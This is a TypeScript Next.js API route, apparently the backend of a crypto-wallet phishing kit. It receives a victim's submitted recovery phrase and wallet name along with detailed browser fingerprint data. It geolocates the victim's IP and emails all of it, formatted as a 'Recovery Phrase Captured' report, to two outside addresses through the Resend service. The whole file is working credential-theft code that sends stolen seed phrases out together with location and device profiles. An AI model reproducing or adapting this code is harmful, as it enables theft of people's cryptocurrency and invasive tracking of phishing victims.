import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

interface GeoData {
  ip?: string;
  city?: string;
  region?: string;
  country_name?: string;
  country_code?: string;
  org?: string;
  asn?: string;
  postal?: string;
  latitude?: number;
  longitude?: number;
  timezone?: string;
  utc_offset?: string;
  currency?: string;
  currency_name?: string;
  languages?: string;
  calling_code?: string;
  emoji_flag?: string;
  continent_code?: string;
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

const S = {
  bg: "#07090f",
  card: "#0d1117",
  cardBorder: "#1f2937",
  headerGrad: "linear-gradient(135deg,#1d4ed8 0%,#4f46e5 50%,#7c3aed 100%)",
  pill: (color: string) =>
    `display:inline-block;padding:2px 10px;border-radius:99px;font-size:11px;font-weight:700;letter-spacing:0.5px;background:${color};`,
};

function badge(text: string | number, bg = "#1e3a5f", color = "#60a5fa") {
  return `<span style="${S.pill(bg)}color:${color};">${text}</span>`;
}

function row(
  label: string,
  value: string | number | boolean | null | undefined,
  options: { mono?: boolean; highlight?: string; pill?: boolean } = {}
) {
  if (value === "" || value === null || value === undefined) return "";
  const display = String(value);
  const styled = options.pill
    ? badge(display)
    : options.mono
    ? `<code style="font-family:monospace;font-size:12px;color:#e2e8f0;">${display}</code>`
    : options.highlight
    ? `<span style="color:${options.highlight};font-weight:600;">${display}</span>`
    : `<span style="color:#cbd5e1;">${display}</span>`;

  return `
  <tr>
    <td style="padding:9px 16px;color:#64748b;font-size:12px;white-space:nowrap;border-bottom:1px solid #1f2937;vertical-align:top;width:35%;">
      ${label}
    </td>
    <td style="padding:9px 16px;font-size:13px;border-bottom:1px solid #1f2937;word-break:break-word;">
      ${styled}
    </td>
  </tr>`;
}

function section(emoji: string, title: string, rows: string) {
  if (!rows.trim()) return "";
  return `
  <div style="margin-bottom:20px;border-radius:10px;overflow:hidden;border:1px solid ${S.cardBorder};">
    <div style="background:#0f172a;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid ${S.cardBorder};">
      <span style="font-size:15px;">${emoji}</span>
      <span style="color:#94a3b8;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;">${title}</span>
    </div>
    <table style="width:100%;border-collapse:collapse;background:${S.card};">
      ${rows}
    </table>
  </div>`;
}

function parseBrowser(ua: string): string {
  if (!ua) return "Unknown";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Edg/")) return "Microsoft Edge";
  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  return "Unknown";
}

function parseOS(ua: string): string {
  if (!ua) return "Unknown";
  if (ua.includes("Windows NT 10")) return "Windows 10 / 11";
  if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
  if (ua.includes("Mac OS X")) return "macOS";
  if (ua.includes("Android")) return "Android";
  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
  if (ua.includes("Linux")) return "Linux";
  return "Unknown";
}

// ─── Route ────────────────────────────────────────────────────────────────────

export async function POST(req: NextRequest) {
  const { phrase, wallet, browserData: bd } = await req.json();

  // IP
  const forwarded = req.headers.get("x-forwarded-for");
  const ip =
    forwarded ? forwarded.split(",")[0].trim()
    : req.headers.get("x-real-ip") ?? "Unknown";

  // Geolocation
  let geo: GeoData = {};
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "WalletApp/1.0" },
    });
    if (geoRes.ok) geo = await geoRes.json();
  } catch { /* silent */ }

  const submittedAt = new Date().toUTCString();
  const words = (phrase as string)?.split(" ") ?? [];
  const wordCount = words.length;
  const browser = parseBrowser(bd?.userAgent ?? "");
  const os = parseOS(bd?.userAgent ?? "");
  const mapUrl = geo.latitude && geo.longitude
    ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`
    : null;
  const flag = geo.emoji_flag ?? (geo.country_code ? "" : "");

  // Numbered word pills for the phrase - using inline-block with normal margin for email client compatibility
  const wordPills = words.map((w: string, i: number) => `
    <span style="display:inline-block;background:#1e1b4b;border:1px solid #3730a3;border-radius:6px;padding:6px 10px;margin:4px 4px 4px 0;white-space:nowrap;">
      <span style="color:#6366f1;font-size:11px;font-weight:700;margin-right:6px;">${i + 1}</span>
      <span style="color:#c7d2fe;font-family:monospace;font-size:14px;">${w}</span>
    </span>`).join("");

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Wallet Phrase Captured</title>
</head>
<body style="margin:0;padding:0;background:${S.bg};font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:${S.bg};padding:16px 0;">
<tr><td align="center" style="padding:0 8px;">
<!--[if mso]>
<table align="center" border="0" cellspacing="0" cellpadding="0" width="600">
<tr><td align="center" valign="top">
<![endif]-->
<table cellpadding="0" cellspacing="0" border="0" style="max-width:600px;width:100%;margin:0 auto;">

  <!-- ══ HEADER ══ -->
  <tr><td>
    <div style="${S.headerGrad};border-radius:12px 12px 0 0;padding:32px 24px;text-align:center;">
      <div style="font-size:40px;margin-bottom:12px;text-shadow:0 4px 12px rgba(0,0,0,0.2);">🔐</div>
      <h1 style="margin:0 0 8px;color:#ffffff;font-size:24px;font-weight:800;letter-spacing:-0.5px;line-height:1.2;">
        Recovery Phrase Captured
      </h1>
      <p style="margin:0 0 16px;color:#c7d2fe;font-size:13px;opacity:0.9;">${submittedAt}</p>
      <div style="margin:0;padding:0;text-align:center;">
        ${badge(wallet ?? "Unknown Wallet", "#1e1b4b", "#c7d2fe")}
        ${badge(flag + " " + (geo.country_name ?? "Unknown Location"), "#064e3b", "#a7f3d0")}
        ${badge(wordCount + "-word phrase", "#7c2d12", "#fed7aa")}
      </div>
    </div>
  </td></tr>

  <!-- ══ BODY ══ -->
  <tr><td style="background:${S.bg};padding:24px 0;">

    <!-- Phrase Card -->
    <div style="margin-bottom:24px;border-radius:12px;overflow:hidden;border:1px solid #3730a3;box-shadow:0 4px 20px rgba(0,0,0,0.4);">
      <div style="background:linear-gradient(90deg,#1e1b4b,#2e1065);padding:12px 20px;border-bottom:1px solid #3730a3;">
        <span style="color:#a5b4fc;font-size:12px;font-weight:800;letter-spacing:1px;text-transform:uppercase;">💰 Wallet &amp; Recovery Phrase</span>
      </div>
      <div style="background:#090b1a;padding:24px 20px;">
        <p style="margin:0 0 4px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Wallet</p>
        <p style="margin:0 0 24px;color:#818cf8;font-size:24px;font-weight:800;letter-spacing:-0.5px;">${wallet ?? "Not provided"}</p>
        <p style="margin:0 0 12px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Recovery Phrase (${wordCount} words)</p>
        <div style="margin:0;padding:0;width:100%;text-align:left;">${wordPills}</div>
        <div style="margin-top:20px;background:#020617;border:1px solid #1e293b;border-radius:8px;padding:16px;">
          <p style="margin:0;font-family:'Courier New',Courier,monospace;font-size:14px;color:#94a3b8;line-height:1.6;word-break:break-all;letter-spacing:0.5px;">${phrase}</p>
        </div>
      </div>
    </div>

    <!-- Location -->
    ${section("📍", "Location & Network Identity", [
      row("IP Address", ip, { mono: true, highlight: "#f87171" }),
      row("Country", `${flag} ${geo.country_name ?? ""} (${geo.country_code ?? "-"})`, { highlight: "#4ade80" }),
      row("Region / City", [geo.region, geo.city].filter(Boolean).join(" › ")),
      row("Postal Code", geo.postal),
      row("Continent", geo.continent_code),
      row("Calling Code", geo.calling_code ? `+${geo.calling_code}` : undefined),
      row("Coordinates", geo.latitude ? `${geo.latitude}, ${geo.longitude}` : undefined),
      row("Timezone", geo.timezone),
      row("UTC Offset", geo.utc_offset),
      row("Currency", geo.currency_name ? `${geo.currency_name} (${geo.currency})` : geo.currency),
      row("Local Languages", geo.languages),
      row("ISP / ASN", [geo.org, geo.asn].filter(Boolean).join(" — ")),
      mapUrl ? row("Map Link", `<a href="${mapUrl}" style="color:#60a5fa;">Open in Google Maps ↗</a>`) : "",
    ].join(""))}

    <!-- Browser & Device -->
    ${section("🖥️", "Browser & Device", [
      row("Browser", browser, { pill: true }),
      row("Operating System", os, { pill: true }),
      row("Device Type", bd?.isMobile ? "📱 Mobile / Tablet" : "🖥️ Desktop", { highlight: bd?.isMobile ? "#f59e0b" : "#60a5fa" }),
      row("User Agent", bd?.userAgent, { mono: true }),
      row("Vendor", bd?.vendor),
      row("Platform", bd?.platform),
      row("Screen Resolution", bd?.screenWidth ? `${bd.screenWidth} × ${bd.screenHeight}` : undefined),
      row("Viewport", bd?.windowWidth ? `${bd.windowWidth} × ${bd.windowHeight}` : undefined),
      row("Colour Depth", bd?.colorDepth ? `${bd.colorDepth}-bit` : undefined),
      row("Device Pixel Ratio", bd?.devicePixelRatio ? `${bd.devicePixelRatio}x` : undefined),
      row("RAM", bd?.deviceMemoryGB ? `${bd.deviceMemoryGB} GB` : undefined),
      row("CPU Cores", bd?.hardwareConcurrency),
      row("Touch Points", bd?.maxTouchPoints),
      row("GPU Renderer", bd?.webglRenderer, { mono: true }),
      row("GPU Vendor", bd?.webglVendor),
      row("Installed Plugins", bd?.plugins, { mono: true }),
    ].join(""))}

    <!-- Hardware: Battery & Network -->
    ${section("⚡", "Battery & Network", [
      row("Battery Level", bd?.batteryLevel, { highlight: "#4ade80" }),
      row("Charging", bd?.batteryCharging),
      row("Connection Type", bd?.connectionType ? bd.connectionType.toUpperCase() : undefined, { pill: true }),
      row("Downlink Speed", bd?.downlinkMbps ? `${bd.downlinkMbps} Mbps` : undefined),
      row("Round-trip Time", bd?.rttMs !== undefined && bd.rttMs !== null ? `${bd.rttMs} ms` : undefined),
      row("Data Saver", bd?.dataSaver !== undefined ? (bd.dataSaver ? "Enabled" : "Disabled") : undefined),
      row("Online at Submit", bd?.isOnline ? "Yes" : "No"),
    ].join(""))}

    <!-- Preferences -->
    ${section("🎨", "User Preferences & Fingerprint", [
      row("Language", bd?.language),
      row("All Languages", bd?.languages),
      row("Dark Mode", bd?.darkMode ? "🌙 Enabled" : "☀️ Disabled"),
      row("Reduced Motion", bd?.reducedMotion ? "Enabled" : "Disabled"),
      row("Cookies Enabled", bd?.cookiesEnabled ? "Yes" : "No"),
      row("Do Not Track", bd?.doNotTrack === "1" ? "Enabled" : bd?.doNotTrack === "0" ? "Disabled" : "Not set"),
      row("Timezone (Client)", bd?.timezone),
      row("Local Time", bd?.localTime),
    ].join(""))}

    <!-- Session -->
    ${section("🕵️", "Session & Origin", [
      row("Page URL", bd?.pageUrl, { mono: true }),
      row("Referrer", bd?.referrer),
      row("Submitted (UTC)", submittedAt, { highlight: "#fb923c" }),
    ].join(""))}

  </td></tr>

  <!-- ══ FOOTER ══ -->
  <tr><td style="background:#0d1117;border-top:1px solid #1f2937;border-radius:0 0 14px 14px;padding:20px 32px;text-align:center;">
    <p style="margin:0 0 8px;color:#1d4ed8;font-size:13px;font-weight:700;">⚠️ CONFIDENTIAL — INTERNAL USE ONLY</p>
    <p style="margin:0 0 4px;color:#cbd5e1;font-size:12px;font-weight:500;">
      Created by <a href="https://uwem.dev" style="color:#60a5fa;text-decoration:none;">Uwem Dev</a>
    </p>
    <p style="margin:0;color:#475569;font-size:11px;">WalletApp Capture System · ${submittedAt}</p>
  </td></tr>

</table>
</td></tr>
</table>
</body>
</html>`;

  try {
    await resend.emails.send({
      from: "Wallet App <onboarding@uwem.dev>",
      // Now using your verified custom domain, you can send to any email!
      to: [
        "uwemuwemetim@gmail.com", 
        "allspamresults990@yahoo.com"
      ],
      subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
      html,
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ success: false, error: (error as Error).message }, { status: 500 });
  }
}
